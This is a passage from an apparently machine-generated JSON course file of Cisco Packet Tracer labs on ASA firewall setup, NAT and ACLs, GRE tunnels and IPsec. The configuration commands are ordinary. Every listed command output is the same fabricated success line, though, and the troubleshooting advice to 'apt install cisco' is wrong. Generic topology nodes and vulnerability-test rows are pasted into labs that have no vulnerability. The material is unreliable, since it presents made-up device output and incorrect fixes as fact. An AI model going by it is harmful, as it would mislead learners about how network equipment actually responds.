    "targetEnvironment": "Cisco Packet Tracer: 1 ASA 5506-X, 1 Inside PC, 1 Router",
    "topology": {
      "description": "Lab topology for Cisco ASA Firewall Basics",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Firewalling",
        "explanation": "Deploy and run a hardware firewall gateway system at the network edge."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Cisco ASA Firewall Basics",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 ASA 5506-X, 1 Inside PC, 1 Router.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Cisco ASA Firewall Basics",
        "description": "Place a Cisco ASA 5506-X appliance template into the perimeter design map. Configure the baseline interfaces, applying appropriate security naming parameters and privilege levels (inside = 100, outside = 0). Write static routing references and build an internal DHCP pool handled by the firewall.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet1/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "nameif inside",
            "description": "Execute nameif command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "security-level 100",
            "description": "Execute security-level command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "ip address 192.168.1.1 255.255.255.0",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "no shutdown",
            "description": "Execute no command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet1/2",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "nameif outside",
            "description": "Execute nameif command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "security-level 0",
            "description": "Execute security-level command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "ip address 203.0.113.2 255.255.255.0",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "no shutdown",
            "description": "Execute no command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "route outside 0.0.0.0 0.0.0.0 203.0.113.1",
            "description": "Execute route command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "dhcpd address 192.168.1.10-192.168.1.50 inside",
            "description": "Execute dhcpd command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "dhcpd enable inside",
            "description": "Execute dhcpd command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          },
          {
            "shell": "cisco",
            "cmd": "show ip address",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0."
          }
        ],
        "verification": "Inside PC receives DHCP lease; interface levels show Inside 100 and Outside 0.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 ASA 5506-X, 1 Inside PC, 1 Router",
          "Cisco Packet Tracer",
          "Inside PC receives DHCP lease; interface...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the default traffic flow rule between Cisco ASA security levels?",
        "hint": "Traffic from higher security levels to lower is allowed; lower to higher is denied by default."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Cisco ASA Firewall Basics?",
      "options": [
        "Deploy and run a hardware firewall gateway system at the network edge.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Deploy and run a hardware firewall gateway system at the network edge."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 25.",
    "eli5Story": {
      "title": "The Big Fortress Gatekeeper (Cisco ASA Firewall)",
      "analogy": "The ASA firewall is a big heavy iron wall dividing the trusted castle (inside) from the wild forest (outside)."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 25",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 ASA 5506-X, 1 Inside PC, 1 Router"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 26,
    "week": 13,
    "classNumber": 26,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 13: Advanced Firewall Architectures",
    "title": "ASA Access Lists & NAT",
    "category": "Firewalling",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Define translation rules and filter external connections tracking toward sensitive assets.",
    "tools": [
      "Cisco Packet Tracer",
      "ASA NAT",
      "ACL"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 ASA, LAN, Web Server, DMZ",
    "topology": {
      "description": "Lab topology for ASA Access Lists & NAT",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Firewalling",
        "explanation": "Define translation rules and filter external connections tracking toward sensitive assets."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for ASA Access Lists & NAT",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 ASA, LAN, Web Server, DMZ.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: ASA Access Lists & NAT",
        "description": "Implement Dynamic PAT (Port Address Translation) on the ASA to enable internal hosts to securely share a public interface address space. Configure a Static NAT translation link for a DMZ Mail Server. Apply an object-group access list to restrict external inbound access strictly to mail traffic (port 25).",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "object network INSIDE_LAN",
            "description": "Execute object command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "subnet 192.168.1.0 255.255.255.0",
            "description": "Execute subnet command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "nat (inside,outside) dynamic interface",
            "description": "Execute nat command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "object network DMZ_MAIL",
            "description": "Execute object command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "host 192.168.2.25",
            "description": "Execute host command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "nat (dmz,outside) static 203.0.113.25",
            "description": "Execute nat command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "access-list OUTSIDE_IN extended permit tcp any host 203.0.113.25 eq 25",
            "description": "Execute access-list command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "access-group OUTSIDE_IN in interface outside",
            "description": "Execute access-group command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          },
          {
            "shell": "cisco",
            "cmd": "show xlate",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ."
          }
        ],
        "verification": "Internal PC browses out using ASA outside IP; external host connects only to port 25 on DMZ.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 ASA, LAN, Web Server, DMZ",
          "Cisco Packet Tracer",
          "Internal PC browses out using ASA outsid...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the distinction between Dynamic PAT and Static 1-to-1 NAT?",
        "hint": "PAT translates multiple hosts to one public IP via ports; Static NAT binds one dedicated IP."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of ASA Access Lists & NAT?",
      "options": [
        "Define translation rules and filter external connections tracking toward sensitive assets.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Define translation rules and filter external connections tracking toward sensitive assets."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 26.",
    "eli5Story": {
      "title": "The Masked Disguise for Outside Visitors (NAT & PAT)",
      "analogy": "When 100 students go on a field trip, they all wear the same school mascot costume so nobody on the street knows their private home addresses!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 26",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 ASA, LAN, Web Server, DMZ"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 27,
    "week": 14,
    "classNumber": 27,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 14: Site-to-Site Encrypted Tunnels",
    "title": "GRE Tunnels over IPsec (Phase 1)",
    "category": "VPN & Tunnels",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Form an overlay virtual network bridge across an open ISP framework to allow routing communication.",
    "tools": [
      "Cisco Packet Tracer",
      "GRE",
      "OSPF"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 2 Branch Routers, ISP Router",
    "topology": {
      "description": "Lab topology for GRE Tunnels over IPsec (Phase 1)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "VPN & Tunnels",
        "explanation": "Form an overlay virtual network bridge across an open ISP framework to allow routing communication."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for GRE Tunnels over IPsec (Phase 1)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 2 Branch Routers, ISP Router.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: GRE Tunnels over IPsec (Phase 1)",
        "description": "Build static connectivity routes across an untrusted ISP link separating two company branch routers. Configure a virtual tunnel interface on each edge system, declaring tunnel sources, destination targets, and internal networks. Initialize an active OSPF routing domain directly across the tunnel interface.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "interface Tunnel0",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "ip address 10.10.10.1 255.255.255.252",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "tunnel source GigabitEthernet0/0",
            "description": "Execute tunnel command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "tunnel destination 203.0.113.2",
            "description": "Execute tunnel command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "router ospf 1",
            "description": "Execute router command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "network 10.10.10.0 0.0.0.3 area 0",
            "description": "Execute network command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "network 192.168.1.0 0.0.0.255 area 0",
            "description": "Execute network command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "show ip interface brief",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          },
          {
            "shell": "cisco",
            "cmd": "show ip route ospf",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0."
          }
        ],
        "verification": "Tunnel0 interface is UP/UP; OSPF neighbor adjacency establishes over Tunnel0.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 2 Branch Routers, ISP Router",
          "Cisco Packet Tracer",
          "Tunnel0 interface is UP/UP; OSPF neighbo...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does raw GRE encapsulation fail to provide security over the public internet?",
        "hint": "GRE encapsulates layer 3 packets but provides zero confidentiality or encryption."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of GRE Tunnels over IPsec (Phase 1)?",
      "options": [
        "Form an overlay virtual network bridge across an open ISP framework to allow routing communication.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Form an overlay virtual network bridge across an open ISP framework to allow routing communication."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 27.",
    "eli5Story": {
      "title": "The Secret Underground Pipe Across Town (GRE Tunnels)",
      "analogy": "Two treehouses on opposite sides of town connect a cardboard pipe across the street so they can pass notes directly."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 27",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 2 Branch Routers, ISP Router"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 28,
    "week": 14,
    "classNumber": 28,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 14: Site-to-Site Encrypted Tunnels",
    "title": "IPsec Tunnel Protection (Phase 2)",
    "category": "VPN & Tunnels",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Apply high-grade encryption layers over virtual routes to secure company traffic.",
    "tools": [
      "Cisco Packet Tracer",
      "IPsec",
      "ISAKMP"
    ],
    "targetEnvironment": "Cisco Packet Tracer (Branch Routers)",
    "topology": {
      "description": "Lab topology for IPsec Tunnel Protection (Phase 2)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "VPN & Tunnels",
        "explanation": "Apply high-grade encryption layers over virtual routes to secure company traffic."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for IPsec Tunnel Protection (Phase 2)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer (Branch Routers).",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: IPsec Tunnel Protection (Phase 2)",
        "description": "Build an ISAKMP Phase 1 management profile (AES-256, SHA-256, DH Group 14) on both branch devices. Create the Phase 2 IPsec transform set configuration parameters. Establish a crypto map index tied to an ACL that catches the GRE tunnel headers, and apply it to the physical public interface.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "crypto isakmp policy 10",
            "description": "Execute crypto command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "encr aes 256",
            "description": "Execute encr command",
